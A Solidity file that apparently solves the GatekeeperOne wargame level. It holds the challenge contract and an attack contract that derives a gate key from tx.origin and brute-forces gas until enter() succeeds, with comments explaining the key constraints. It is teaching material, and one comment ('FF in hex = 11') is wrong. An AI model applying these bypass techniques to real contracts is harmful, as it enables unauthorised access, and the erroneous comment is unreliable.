// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackGateKeeper1 {
    function attackEnter(address _target) public {
        //FF in hex = 11
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        for (uint256 i = 0;i<300;i++) {
            uint256 totalGas = i + (8191 * 3);
            (bool result,) = _target.call{gas: totalGas}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (result) {
                break;
            }
        }
        //req1:
        //input: 8bytes: 0x B1 B2 B3 B4 B5 B6 B7 B8
        //uint64 -> 8 bytes
        //uint32 -> 4 bytes, right -> 0x B5 B6 B7 B8
        //uint16 -> 2 bytes, right -> 0x B7 B8
        //req1. -> B5 and B6 must be 0s

        //req2:
        //B1 B2 B3 B4 must not be 0s
        //0x 00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8

        //req3:
        //0x B5 B6 B7 B8 
        //uin160 = 20 bytes > eth address length
        //uint16(uint160)-> last 2 bytes
        //0x B5 B6 B7 B8 = 2 bytes from address

        //+req1 -> 0x B7 B8  = 2 bytes from address
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}